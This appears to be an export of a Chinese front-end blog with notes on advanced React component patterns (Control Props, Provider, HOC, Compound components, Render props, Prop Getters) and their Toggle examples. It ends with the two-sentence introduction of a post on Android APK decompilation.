所以說，Control Props 就是想利用這樣的技巧，讓你的元件在讓使用者自行操作 input 時，能確保元件內部狀態的 single source of truth。透過這種方式，也就能夠從使用者角度來同步多個元件的內部狀態。
一樣已先前的 Toggle 元件來舉例，但這次我們用個簡化版：
假設今天使用者想同步兩個元件的狀態，他們可以透過本身的 State 來控制，並在 onToggle 時來更動 State：
class App extends React.Component &#123;  state = &#123; bothOn: false &#125;;  handleToggle = on =&gt; &#123;    this.setState(&#123; bothOn: on &#125;);  &#125;;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Toggle on=&#123;this.state.bothOn&#125; onToggle=&#123;this.handleToggle&#125;&gt;           &#123;(&#123; on, toggle &#125;) =&gt; (            &lt;div&gt;              &#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;              &lt;hr /&gt;              &lt;button className=&quot;button1&quot; onClick=&#123;toggle&#125;&gt;                &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;              &lt;/button&gt;              &lt;hr /&gt;            &lt;/div&gt;          )&#125;        &lt;/Toggle&gt;        &lt;Toggle on=&#123;this.state.bothOn&#125; onToggle=&#123;this.handleToggle&#125;&gt;          &#123;(&#123; on, toggle &#125;) =&gt; (            // same render props as above          )&#125;        &lt;/Toggle&gt;      &lt;/div&gt;    );  &#125;&#125;

但要記得，onToggle 實際上是 Toggle 元件內部執行完 toggle 後才會執行的動作（告知使用者該元件”被” Toggle 了），這樣的話，元件要怎麼依照傳入的 Props 來處理內部狀態呢？
來看一下我們 Toggle 的實作：
class Toggle extends React.Component &#123;  state = &#123; on: false &#125;;  isControlled(prop) &#123;    return this.props[prop] !== undefined;  &#125;  getState() &#123;    return Object.entries(this.state).reduce((combinedState, [key, value]) =&gt; &#123;      if (this.isControlled(key)) &#123;        combinedState[key] = this.props[key];      &#125; else &#123;        combinedState[key] = value;      &#125;      return combinedState;    &#125;, &#123;&#125;);  &#125;  toggle = () =&gt; &#123;    if (this.isControlled(&quot;on&quot;)) &#123;      this.props.onToggle(!this.getState().on);    &#125; else &#123;      this.setState(        (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),        () =&gt; &#123;          this.props.onToggle(this.getState().on);        &#125;      );    &#125;  &#125;;  render() &#123;    return this.props.children(&#123; ...this.getState(), toggle: this.toggle &#125;);  &#125;&#125;

主要重點在於，每次 toggle 被 trigger 時，我們都會先去確認一下 on 這個 state 有沒有被使用者 Controlled（isControlled()），若是使用者有透過 props（使用者端）傳值給這個 state（元件內部），就代表我們得將該 state 的掌控交給使用者。
什麼叫『交給使用者』呢？
其實也就是要將使用者傳入的 props 與我們自己本身的 state 做 combination，並將結果當作元件實際的 state 來使用，如同上述程式碼中的 getState() 函數。之後元件所有需要操作 state 的地方都需要透過該函數來取得元件的 Current State。
如此一來，只要使用者有傳入 on 這個 props，元件內部關於 on 這個 state 的變化，就會像是由使用者本身操控一般（因為我們在每次取得 current state 時都會 merge props 中對應的值），也就能讓使用者同步多個 Toggle component 了！
Control Props 用文字敘述比較繁瑣難懂，可以到下面的 demo link 玩玩，試著把 Toggle component 的 on props 拿掉看看差別，拿掉 props 後，兩個元件的狀態就無法同步，但元件本身的狀態還是正常的。demo link
在 Kent C. Dodds 的 workshop 中，他其實還有介紹如何整合先前的 State Reducer 與 Control Props，不過我覺得過於複雜，除了很難光用文字敘述外，實際使用的機會感覺也不大，如果有興趣的讀者可以直接去 codesandbox 上看範例(file 10.js)
ProviderProvider pattern 其實是為了解決 Props drilling 的問題，什麼是 Props drilling 呢？
舉個簡單例子：
class Toggle extends React.Component &#123;  state = &#123; on: false &#125;;  toggle = () =&gt; &#123; /*...*/ &#125;;  render() &#123;    return this.props.children(&#123; ...this.state, toggle: this.toggle &#125;);  &#125;&#125;const Layer1 = (&#123;toggle, ...props&#125;) =&gt; &lt;Layer2 toggle=&#123;toggle&#125; /&gt;const Layer2 = (&#123;toggle, ...props&#125;) =&gt; &lt;Layer3 toggle=&#123;toggle&#125; /&gt;const Layer3 = (&#123;toggle, ...props&#125;) =&gt; &lt;button onClick=&#123;toggle&#125; /&gt;class App extends React.Component &#123;  handleToggle = () =&gt; &#123;&#125;;  render() &#123;    return (      &lt;Toggle onToggle=&#123;this.handleToggle&#125;&gt;        &lt;Layer1 /&gt;      &lt;/Toggle&gt;    );  &#125;&#125;

我知道這段 code 很奇怪，但這裡想呈現的重點是，有些時候我們可能真的想要把某個外層的 props 往下傳遞給底下的 component，這種情況下可能得一層一層將 props 往下帶，即便中間經過的 component 都不需要用到該 props。
要解決這樣的問題，可以利用 React 的 Context API。
雖然在 React 16 以前，Context API 在官方文件是一直處於一種不推薦使用的狀態，但大概因為太多人需要吧（像是 redux 等 state management 其實都有用到），現在有了新的實作，讓我們終於可以放心使用 Context API 了，因此這邊要介紹的 Provider pattern，其實就是利用 React 最新的 Context API 來解決 Props drilling 問題！
早在上篇中介紹的 Compound component 我們就有用到 Provider pattern 了，而現在就讓我們用剛剛那個離奇的例子來做點修正吧：
const ToggleContext = React.createContext();class Toggle extends React.Component &#123;  static Consumer = ToggleContext.Consumer;  toggle = () =&gt; this.setState((&#123; on &#125;) =&gt; (&#123; on: !on &#125;));  state = &#123; on: false, toggle: this.toggle &#125;;  render() &#123;    const &#123; children, ...rest &#125; = this.props;    const ui = typeof children === &quot;function&quot; ? children(this.state) : children;    return (      &lt;ToggleContext.Provider value=&#123;this.state&#125; &#123;...rest&#125;&gt;        &#123;ui&#125;      &lt;/ToggleContext.Provider&gt;    );  &#125;&#125;

利用 React 16 後出現的 React.createContext()，創造一個 ToggleContext，並將其提供的 Consumer 當作 static 變數放在 Toggle 中。
接著在 render function 中我們使用 Context API 提供的另一個 component Provider，將傳入 Toggle 的 render props 包裹住，並且將 Toggle 本身的 state 或 function 傳到 value 這個 props 中。如此一來，Toggle 底下的所有 children 之後只要將自己用 Toggle.Consumer 包住就可以自由存取 Toggle 傳下來的 value：
const Layer1 = () =&gt; &lt;Layer2 /&gt;;const Layer2 = () =&gt; &lt;Layer3 /&gt;;const Layer3 = () =&gt; (  &lt;Toggle.Consumer&gt;    &#123;(&#123; on, toggle &#125;) =&gt; (      &lt;Fragment&gt;        &lt;div&gt;&#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;&lt;/div&gt;        &lt;button className=&quot;button1&quot; onClick=&#123;toggle&#125;&gt;          &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;        &lt;/button&gt;      &lt;/Fragment&gt;    )&#125;  &lt;/Toggle.Consumer&gt;);class App extends React.Component &#123;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Toggle&gt;          &lt;Layer1 /&gt;        &lt;/Toggle&gt;      &lt;/div&gt;    );  &#125;&#125;

由上面的程式碼可以看到，Toggle component 的 state 與 toggle function 都會被當成 props 傳給被 Toggle.Consumer 包裹著的 children。
包在第三層的 &lt;Layer3 /&gt; 就可以直接拿到想要的 on 與 toggle，再也不用從 Layer1 傳到 Layer2 再傳到 Layer3 了！
Demo Link
Higher-order component最後一個 Pattern 我想是大家最熟悉，也是我認為最需要懂得融會貫通的 Higher-order component，通常簡稱 HOC。旨在解決 Cross-Cutting Concerns，說白一點就是讓你將一些可共用的邏輯抽取出來，讓其他元件透過 HOC 的包裝後，能獲得該共用功能，之後修改新增時不會因為邏輯跟元件綁太緊而出現問題。
雖然很重要，但這個 Pattern 相對簡單，React 官網其實就有非常詳細的介紹。這邊就簡單介紹就好，先來個範例吧：
const Layer1 = () =&gt; &lt;Layer2 /&gt;;const Layer2 = () =&gt; &lt;Layer3 /&gt;;const Layer3 = withToggle((&#123;contextProps: &#123; on, toggle &#125;&#125;) =&gt; (  &lt;Fragment&gt;    &lt;div&gt;&#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;&lt;/div&gt;    &lt;button className=&quot;button1&quot; onClick=&#123;toggle&#125;&gt;      &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;    &lt;/button&gt;  &lt;/Fragment&gt;));const Layer4 = withToggle((&#123;contextProps: &#123; on, toggle &#125;&#125;) =&gt; (  &lt;Fragment&gt;    &lt;div&gt;      &lt;button className=&quot;button2&quot; onClick=&#123;toggle&#125;&gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;    &lt;/div&gt;    &lt;div&gt;&#123;on ? &quot;The button2 is on&quot; : &quot;The button2 is off&quot;&#125;&lt;/div&gt;  &lt;/Fragment&gt;));class App extends React.Component &#123;  render() &#123;    return (      &lt;div className=&quot;App&quot;&gt;        &lt;Toggle&gt;          &lt;Layer1 /&gt;          &lt;Layer4 /&gt;        &lt;/Toggle&gt;      &lt;/div&gt;    );  &#125;&#125;

這個範例延續前一個 Provider pattern，我們將 Toggle.Consumer 抽出來，包裝成一個 HOC withToggle，這樣一來，我們可以輕鬆製造出多個擁有 Toggle component 功能與狀態的元件，像是這邊的 Layer3 與 Layer4，他們只需要 care 自己的 UI 邏輯即可，剩下與 Toggle 相關的狀態操作都交由 withToggle 這個 HOC 幫忙處理。
而 withToggle 長這樣：
function withToggle(Component) &#123;  function Wrapper(props, ref) &#123;    return (      &lt;Toggle.Consumer&gt;        &#123;toggleContext =&gt; (          &lt;Component contextProps=&#123;toggleContext&#125; &#123;...props&#125; ref=&#123;ref&#125; /&gt;        )&#125;      &lt;/Toggle.Consumer&gt;    );  &#125;  Wrapper.displayName = `withToggle($&#123;Component.displayName ||    Component.name&#125;)`;  return hoistNonReactStatics(React.forwardRef(Wrapper), Component);&#125;

是不是很簡單呢！
HOC 負責主要的共用邏輯，在這邊就是 Toggle.Consumer 這段，然後將傳入的 Component 塞入，可能是放在 render 或是像這邊是傳入 Consumer 的 children。
特別要注意的有三點，一個是 displayName，由於 HOC 會回傳一個新的 Component，這時如果你沒有明確定義一個 displayName 的話，在 Dev tool 裡你就只能看到一個 Unknown 的元件，會造成開發上的困擾，所以記得要指定一下 displayName，通常會用 HOC 自己的名稱加上原有 Component 的 displayName。
另一個要注意的點是 forwardRef，在 React 中，ref 與 props 的處理方式不相同，ref 並不會如同 props 一般往下傳遞，若你想要取得被 HOC 包裹過的 component 的 ref，那在你的 HOC 中，必須使用 React.forwardRef 將其 forward 下去，詳細介紹可以看官網說明。
最後，假如你原先的 component 有一些 static method，透過 HOC 包裝後，你可能會發現那些 static method 都取不到了！
你必須要在 HOC 中自行複製一份到 HOC 上頭，像這樣（取自 React 官網)：
function enhance(WrappedComponent) &#123;  class Enhance extends React.Component &#123;/*...*/&#125;  // Must know exactly which method(s) to copy :(  Enhance.staticMethod = WrappedComponent.staticMethod;  return Enhance;&#125;

但這樣太麻煩了，我們可以直接利用 hoistNonReactStatics 這套 lib 來幫忙，這樣就萬無一失了！
import hoistNonReactStatic from &#x27;hoist-non-react-statics&#x27;;function enhance(WrappedComponent) &#123;  class Enhance extends React.Component &#123;/*...*/&#125;  hoistNonReactStatic(Enhance, WrappedComponent);  return Enhance;&#125;

Demo Link
結論介紹了這麼多種 Pattern，其實我覺得 HOC、Render Props 與 Compound Component 是最需要好好掌握並且多加運用的，其他如 State Reducer、Prop Collections and Getters 則是平常在進行 Code Review 時，可以好好拿出來思考一下是否能夠採用，為你的專案加分。無論如何，經過這樣的學習與紀錄，至少讓自己平日開發時，能主動多思考一些優化的方向與可能性，總體是蠻有收穫的！
最後提供大家 Kent C. Dodds 在 workshop 後自己寫的一篇文章，Mixing Component Patterns，裡頭他將這些 pattern 結合在一起使用，有興趣的讀者可以去看看到底這麼多 Pattern 要怎麼融合使用。
謝謝真的有看到這邊的各位，這些筆記斷斷續續的紀錄，一不小心就篇幅很多…若發現中間有敘述不順或是錯誤的地方，歡迎大家告知！
資料來源
Advanced React Patterns workshop
Advanced React Patterns V2 codesandbox
Advanced React Patterns Blog
Answers to common questions about render props
Do more with less using render props
React new context api
Mixing Component Patterns

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>react</tag>
        <tag>es6</tag>
        <tag>javascript</tag>
        <tag>pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>進階 React Component Patterns 筆記（上）</title>
    <url>/2018/06/27/advanced-react-component-patterns-note/</url>
    <content><![CDATA[前言前不久在 Frontend masters 看到一部影片 Advanced React Patterns，是 Paypal 的工程師 Kent C. Dodds 在某場 workshop 介紹他實作 React component 時所使用的進階 React Patterns（目前似乎要付費觀看，而他在 egghead.io 上也有一系列教學，同樣要收費就是了…），內容非常豐富扎實，若是想提供一些可高度客製化的共用元件，使用這些 Pattern 絕對是有絕佳的幫助！如果可以，我強烈建議大家自己去聽聽，不用把時間花在閱讀我的文字上 :p
自從看完那影片後，平常開發都會不自覺得去思考這些 pattern，看看如果應用到我目前的專案中，能否帶來益處。
當然有些早已有在使用，而有些則苦無伸展之處，為了加深自己對這些 pattern 的印象與理解，今天就來筆記一下這系列影片的內容，也希望能對來到這邊的讀者有所幫助。
為何要有 Pattern在開始介紹之前，我其實想討論一下為什麼需要有 Pattern，或是說，我們真的需要 Pattern 嗎？
會有這樣的疑問其實是在過往經驗中，還蠻常發現採用 Design pattern 的程式碼如果需要修改時，對於不熟悉該 Pattern，或是原作者雖然採用某種 Pattern，但沒有堅持到底，在一些地方為了方便而改採取別種作法；更慘的情況是，在錯誤的情境下，採用了不適合的 pattern，這些情況都容易造成維護上的極大困擾。
所謂的 Pattern，代表的應該是『被分門別類過，通過反覆使用與測試的考驗，且多數人知曉的程式設計經驗總結』，如果說，你今天採用的 Pattern 是團隊內的人都能接受並理解的，然後也都同意該情境下非常適合使用那種 Pattern，非他莫屬，直接打趴其他簡單做法的優缺點，那麼使用 Pattern 是絕對有好處的，除了測試的穩定性、程式碼的重用性外，在開發共用 component 或套件上，更有助於一般元件使用者，像是可以 export 出更加簡潔、方便的 API 等等。
若不是上述情況，有道是『最好的 Pattern，就是沒有 Pattern』，讓邏輯單純簡單、不影響效能、方便接手的人進行維護，可能比起刻意套用 Pattern 來得有效益。所以在開發前，最好花點時間釐清自己的狀況。
不過，你也得先了解有哪些 Patterns，才能在開發時有參考依據麻！所以不管你現在用不用得到，多學還是好的！
React Component Patterns主要想介紹的 React Component Pattern 有幾種：

Compound comopnent
Render props comopnent
Prop Collections and Getters
State Initializers
State Reducer
Control Props
Provider
Higher-order component

但礙於篇幅關係，打算拆成幾篇文章來說明，今天是上篇，會介紹到 Compound component、Render props component 與 Prop Collections and Getters。
Compound component假設今天你要撰寫一個 Toggle Component，並且分別在 state On 或 Off 時，能夠顯示不同的文字描述，你會怎麼做？
一個很直覺的做法是，利用 props 來傳遞不同 state 時所需要顯示的文字（只是呈現 idea，並非有功能的 code）：
class Toggle extends React.Component &#123;  state = &#123; on: false &#125;  render() &#123;    const &#123; whenOn, whenOff &#125; = this.props;    return this.state.on ? whenOn : whenOff;  &#125;&#125;&lt;Toggle  whenOn=&quot;Toggle is on&quot;  whenOff=&quot;Toggle is off&quot;/&gt;

這樣做當然可行，但有幾個明顯的壞處：

順序無法調動：沒辦法讓 Toggle component 的使用者自由得調整 whenOn 與 whenOff 的顯示順序，除非你另外加入其他 props 來控制。
利用 Props 來傳遞 UI 元件的話，容易造成使用者困擾，只能盡量透過 props 的命名來區別 UI 元件與其他狀態控制的 pros，舉例來說，如果今天 Toggle 還有一個 props 是來控制 toggle on 時的 callback：  &lt;Toggle  whenOn=&quot;Toggle is on&quot;  whenOff=&quot;Toggle is off&quot;｀  whenOnCallback=&#123;() =&gt; console.log(&#x27;yeee, I am on&#x27;)&#125;/&gt;
  看起來就不是一個非常好的 API 設計，對吧？

要解決這種情況，最適合的方式就是採用 Compound component！
所謂的 Compound component 就是讓你的 UI 元件透過 this.props.children 的方式傳入給 parent component，利用 React.Children.map() 來 render 所有傳入的 this.props.children，並且透過 React.cloneElement 將 parent 的 state 傳入每個 children 的 props，讓 parent 與 children 之間會 隱含著狀態的共享，對於元件使用者來說，他只需要傳入想要的 children component，不用知道 parent 與 children 之間如何溝通，當然也能隨意調整順序，這樣的 API 設計，對於元件使用者就非常的友善。
在這樣的原則下，不難發現，Compound component 必須要 同時結合使用 parent component 與 children component 才有意義。
以剛剛的 &lt;Toggle&gt; 為例子，若改以 Compound component 的話：
class Toggle extends React.Component &#123;  static On = (&#123; on, children &#125;) =&gt; on &amp;&amp; children;  static Off = (&#123; on, children &#125;) =&gt; !on &amp;&amp; children;  static Button = (&#123; on, toggle &#125;) =&gt; &lt;button onClick=&#123;toggle&#125; /&gt;  static defaultProps = &#123; onToggle: () =&gt; &#123; &#125; &#125;  state = &#123; on: false &#125;  toggle = () =&gt;    this.setState(      (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),      () =&gt; this.props.onToggle(this.state.on),    )  render() &#123;    const children = React.Children.map(      this.props.children,      child =&gt;        React.cloneElement(child, &#123;          on: this.state.on,          toggle: this.toggle,        &#125;),    )    return &lt;div&gt;&#123;children&#125;&lt;/div&gt;  &#125;&#125;&lt;Toggle  onToggle=&#123;on =&gt; console.log(&#x27;toggle&#x27;, on)&#125;&gt;  &lt;Toggle.On&gt;The button is on&lt;/Toggle.On&gt;  &lt;Toggle.Off&gt;The button is off&lt;/Toggle.Off&gt;  &lt;Toggle.Button /&gt;&lt;/Toggle&gt;

Demo link
我們透過 Toggle Class 的 static properties 來定義 children component，這樣的好處是我們能夠從名稱上就保持 Parent 與 Children Component 之間的關聯性。
透過 Compound Component，不僅能讓使用者自訂元件順序，又能將 UI component 與其他 callback props 做個清楚的切割。對於使用者來說，完全不需要管 Toggle 的 state 變化時，Toggle.On 要怎麼變動，他們之間的 state 與 props 都由 Parent component 處理。
另外，在 Kent C. Dodds 的 workshop 中，有人提問為何不直接用 this.props.children.map 就好，而要用 React.Children.map？
原因在於，在目前 React 的實作中，當你的 children 只有一個時，this.props.children 不會是一個 array，透過 React.Children.map 能寫得更簡潔，少些判斷。
看到這邊，不知道有沒有想到，其實我們在撰寫表單時常用的 &lt;select&gt; 與 &lt;option&gt; 就是一個 Compound component 的例子：
&lt;select&gt;  &lt;option&gt;Opt 1&lt;option&gt;  &lt;option&gt;Opt 2&lt;option&gt;&lt;/select&gt;

更有彈性的 Compound Component在上面的例子中，其實只要使用者更動其中一個 children，整個 Compound component 就會壞掉：
&lt;Toggle  onToggle=&#123;on =&gt; console.log(&#x27;toggle&#x27;, on)&#125;&gt;  &lt;Toggle.On&gt;The button is on&lt;/Toggle.On&gt;  &lt;Toggle.Off&gt;The button is off&lt;/Toggle.Off&gt;  &lt;div&gt;    &lt;Toggle.Button /&gt;  &lt;/div&gt;&lt;/Toggle&gt;

因為 React.Children.map 只會 for-loop 到第一層的 children，也就是說，React.cloneElement 現在不會複製 &lt;Toggle.Button&gt; 而是複製 &lt;div&gt; 了。
不過好在現在有了 React 16 的 Context API，要解決這個問題簡單了不少，主要就是將 state 的共享改由 Context 來完成：
const ToggleContext = React.createContext(&#123;  on: false,  toggle: () =&gt; &#123;&#125;&#125;);class Toggle extends React.Component &#123;  static On = (&#123; children &#125;) =&gt; (    &lt;ToggleContext.Consumer&gt;      &#123;contextValue =&gt; contextValue.on &amp;&amp; children&#125;    &lt;/ToggleContext.Consumer&gt;  );  static Off = (&#123; children &#125;) =&gt; (    &lt;ToggleContext.Consumer&gt;      &#123;contextValue =&gt; !contextValue.on &amp;&amp; children&#125;    &lt;/ToggleContext.Consumer&gt;  );  static Button = () =&gt; (    &lt;ToggleContext.Consumer&gt;      &#123;contextValue =&gt; &lt;button onClick=&#123;contextValue.toggle&#125;&gt; Toggle &lt;/button&gt;&#125;    &lt;/ToggleContext.Consumer&gt;  );  static defaultProps = &#123; onToggle: () =&gt; &#123;&#125; &#125;;  state = &#123; on: false &#125;;  toggle = () =&gt;    this.setState(      (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),      () =&gt; this.props.onToggle(this.state.on)    );  render() &#123;    // 由於不用傳遞 props 給 children，也就不用 React.Children.map 了，直接使用 this.props.children 即可    return (      &lt;ToggleContext.Provider        value=&#123;&#123;          on: this.state.on,          toggle: this.toggle        &#125;&#125;      &gt;        &#123;this.props.children&#125;      &lt;/ToggleContext.Provider&gt;    );  &#125;&#125;&lt;Toggle onToggle=&#123;on =&gt; console.log(&quot;toggle&quot;, on)&#125;&gt;  &lt;Toggle.On&gt;The button is on&lt;/Toggle.On&gt;  &lt;Toggle.Off&gt;The button is off&lt;/Toggle.Off&gt;  &lt;div&gt;    &lt;Toggle.Button /&gt;  &lt;/div&gt;&lt;/Toggle&gt;

Demo Link
如此一來，使用者想要在我們的 Componet 裡面如何 wrap 各個 Child Component 都可以了！
Note: 在 workshop 中，Kent C. Dodds 有提到關於在 render 時， Provider 每次都會接收到新 object，造成多餘 re-render 的問題，因此可以做點小改良：將要傳給 Provider 的 value 改以 this.state 傳入，這樣每次在 render Toggle 時，才不會讓所有 Toggle 的 children component 也 re-render。只是要特別注意你原本要傳入 context 的 value 內，若有一些 function 如 this.toggle，記得確保你的 state 在宣告時能取得到。
//...toggle = () =&gt;  this.setState(    (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),    () =&gt; this.props.onToggle(this.state.on)  );state = &#123; on: false, toggle: this.toggle &#125;; // 將 state 移至 toggle function 之下，以確保 refer 得到render() &#123;  // 由於不用傳遞 props 給 children，也就不用 React.Children.map 了，直接使用 this.props.children 即可  return (    &lt;ToggleContext.Provider      value=&#123;this.state&#125;    &gt;      &#123;this.props.children&#125;    &lt;/ToggleContext.Provider&gt;  );&#125;//...

不過當你並不想把所有 state 都放入 context 時，可能就得想另一種方法了。
Render props comopnentRender props 相對於 Compound Component 來說應該是比較有名的 Pattern，而他的概念與實作方式也相對簡單，網路上也早有針對 Render props 的相關討論，像這個或這個。
從名稱就可以猜出一二，所謂 Render props 就是將 render function 當作 props 傳入，讓原本的 render function 的控制權，從內部元件本身移轉至使用該元件的使用者身上，這種方式讓使用元件的使用者可以更方便的操作 ｀state，而實作方式上比較常看到的有兩種：

將 render 當作 props 傳入：
  class Toggle extends React.Component &#123;  static defaultProps = &#123; onToggle: () =&gt; &#123; &#125; &#125;  state = &#123; on: false &#125;  toggle = () =&gt;    this.setState(      (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),      () =&gt; this.props.onToggle(this.state.on),    )  render() &#123;    return this.props.renderToggle(&#123;on: this.state.on, toggle: this.toggle&#125;);  &#125;&#125;&lt;Toggle  onToggle=&#123;on =&gt; console.log(&#x27;toggle&#x27;, on)&#125;  renderToggle=&#123;(&#123;on, toggle&#125;) =&gt; (    &lt;div&gt;      &#123;on ? &#x27;The button is on&#x27; : &#x27;The button is off&#x27;&#125;      &lt;hr /&gt;      &lt;buttononClick=&#123;toggle&#125;&gt;        &#123;on ? &#x27;click on&#x27; : &#x27;click off&#x27;&#125;      &lt;/button&gt;    &lt;/div&gt;  )&#125;/&gt;

用 this.props.children 來呼叫 render props：
  class Toggle extends React.Component &#123;    static defaultProps = &#123; onToggle: () =&gt; &#123; &#125; &#125;    state = &#123; on: false &#125;    toggle = () =&gt;      this.setState(        (&#123; on &#125;) =&gt; (&#123; on: !on &#125;),        () =&gt; this.props.onToggle(this.state.on),      )    render() &#123;      return this.props.children(&#123;on: this.state.on, toggle: this.toggle&#125;);    &#125;  &#125;  &lt;Toggle    onToggle=&#123;on =&gt; console.log(&#x27;toggle&#x27;, on)&#125;  &gt;    &#123;(&#123;on, toggle&#125;) =&gt; (      &lt;div&gt;        &#123;on ? &#x27;The button is on&#x27; : &#x27;The button is off&#x27;&#125;        &lt;hr /&gt;        &lt;button onClick=&#123;toggle&#125;&gt;          &#123;on ? &#x27;click on&#x27; : &#x27;click off&#x27;&#125;        &lt;/button&gt;      &lt;/div&gt;    )&#125;  &lt;/Toggle&gt;

Demo Link
以這兩種方法來說，我的想法與 Kent C. Dodds 相同，以 this.props.children 來呼叫 render props 在使用上比較有優勢，除了可以明確知道 Toggle 元件的起始點外，還可以避免 當 renderProps 的內容很多時，容易 miss 掉一些 Toggle 的重要 props 的問題，例如下面的範例：


Prop Collections and Getters在 Kent C. Dodds 的 workshop 中所提到的 Prop Collections 與 Prop Getters 其實是要搭配運用的。
我們將上面的例子稍微改變一下：
&lt;Toggle onToggle=&#123;on =&gt; console.log(&quot;toggle&quot;, on)&#125;&gt;  &#123;(&#123; on, toggle &#125;) =&gt; (    &lt;div&gt;      &#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;      &lt;hr /&gt;      &lt;button class=&quot;button1&quot; onClick=&#123;toggle&#125; aria-pressed=&#123;on&#125;&gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;      &lt;hr /&gt;      &lt;button class=&quot;button2&quot; onClick=&#123;toggle&#125; aria-pressed=&#123;on&#125; aria-label=&quot;custom-button2&quot;&gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;    &lt;/div&gt;  )&#125;&lt;/Toggle&gt;

現在我們有兩個 button 可以同時更改 Toggle 的狀態，而稍微注意一下可以發現兩個 button 其實接收的 props 有共通的部份，目前的寫法很多餘，也不好看。這時候我們就可以創造一個 Prop collections 來負責提供 Common 的 props：
class Toggle extends React.Component &#123;  //... Same as before  getStateAndHelpers() &#123;    return &#123;      on: this.state.on,      togglerProps: &#123; // collection for common Props        &quot;aria-pressed&quot;: this.state.on,        onClick: this.toggle      &#125;    &#125;;  &#125;  render() &#123;    return this.props.children(this.getStateAndHelpers());  &#125;&#125;

而剛剛的範例就能修改為：
&lt;Toggle onToggle=&#123;on =&gt; console.log(&quot;toggle&quot;, on)&#125;&gt;  &#123;(&#123; on, togglerProps &#125;) =&gt; (    &lt;div&gt;      &#123;on ? &quot;The button is on&quot; : &quot;The button is off&quot;&#125;      &lt;hr /&gt;      &lt;button class=&quot;button1&quot; &#123;...togglerProps&#125;&gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;      &lt;hr /&gt;      &lt;button        class=&quot;button2&quot;        &#123;...togglerProps&#125;        aria-label=&quot;custom-button2&quot;      &gt;        &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;      &lt;/button&gt;    &lt;/div&gt;  )&#125;&lt;/Toggle&gt;

但這樣做你可能會發現一個缺點，就是當別人不小心 overwrite 你的 common props 時，你無能為力。這其實也是 render props 的一個小缺點，例如：
&lt;button  class=&quot;button1&quot;  &#123;...togglerProps&#125;  onClick=&#123;() =&gt; &#x27;overwrite&#x27;&#125; // 蓋過我們原先在 onClick 的操作 (this.toggle)&gt;  &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;&lt;/button&gt;

這時候 Prop Getters 就可以出動了！在原本的 Prop collections（togglerProps）中，我們改以呼叫一個 Prop Getter 的方式取得 common props：
class Toggle extends React.Component &#123;  //... Same as before  getTogglerProps = (&#123; onClick, ...props &#125; = &#123;&#125;) =&gt; (&#123;    &#x27;aria-pressed&#x27;: this.state.on,    onClick: () =&gt; &#123;      this.toggle();      onClick &amp;&amp; onClick();    &#125;,    ...props,  &#125;)  getStateAndHelpers() &#123;    return &#123;      on: this.state.on,      getTogglerProps: this.getTogglerProps    &#125;;  &#125;  render() &#123;    return this.props.children(this.getStateAndHelpers());  &#125;&#125;

如此一來，使用者所提供的 onClick 就不會蓋過我們元件原始的 onClick 行為，也就是 this.toggle：
&lt;button  class=&quot;button2&quot;  &#123;...getTogglerProps(&#123;    onClick: () =&gt; console.log(&#x27;overwrite&#x27;)  &#125;)&#125;  aria-label=&quot;custom-button2&quot;&gt;  &#123;on ? &quot;click on&quot; : &quot;click off&quot;&#125;&lt;/button&gt;

如果想要 overwrite 更多的 method，在 Prop Getter 中也要做相對應的判斷與修改：
getTogglerProps = (&#123; onClick, otherMethod, ...props &#125; = &#123;&#125;) =&gt; (&#123;  &#x27;aria-pressed&#x27;: this.state.on,  onClick: () =&gt; &#123;    this.toggle();    onClick &amp;&amp; onClick();  &#125;,  otherMethod: () =&gt; &#123;    this.originOtherMethod();    otherMethod &amp;&amp; otherMethod();  &#125;  ...props,&#125;)

如果嫌每次都要判斷傳入的 props 是否存在很麻煩，可以學 Kent C. Dodds 寫一個 handy funtion：
const callAll = (...fns) =&gt; (...args) =&gt;  fns.forEach(fn =&gt; fn &amp;&amp; fn(...args));getTogglerProps = (&#123; onClick, otherMethod, ...props &#125; = &#123;&#125;) =&gt; (&#123;  &#x27;aria-pressed&#x27;: this.state.on,  onClick: callAll(onClick, this.toggle),&#125;)

Demo Link
結論今天統整了三個 React component patterns: Compound Component、Render Props 與 Prop Collections &amp; Getters，讓我自己對這幾個 pattern 更熟悉了一些，不過還是要盡量運用在自己的專案當中，才能確切感受其好處，並更得心應手。也希望這些整理對來到這邊的讀者有所幫助，剩下的幾個 Pattern 會陸續補上，決不食言！
最後，再次呼籲大家去看看 Kent C. Dodds 的影片 Advanced React Patterns，我比較推薦看 workshop 的版本，因為還可以聽到現場其他人對他的提問，以及他的回答，都很有幫助！
資料來源
Advanced React Patterns workshop
Advanced React Patterns V2 codesandbox
Advanced React Patterns Blog
什麼是設計模式
Answers to common questions about render props
Do more with less using render props

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>react</tag>
        <tag>es6</tag>
        <tag>javascript</tag>
        <tag>pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>人人都會的 Android Apk 反編譯</title>
    <url>/2016/03/24/android-decompile-introduction/</url>
    <content><![CDATA[對於 Android 工程師來說，了解如何反編譯可以增進自己對 Android 底層的理解，也可以思考如何保護自己的 apk 不被反編譯。
對於一般人來說，許多現成的工具可以幫助我們非常輕鬆的、只要打打幾個指令就可以反編譯 apk，看到 java source code，滿足自己的好奇心。
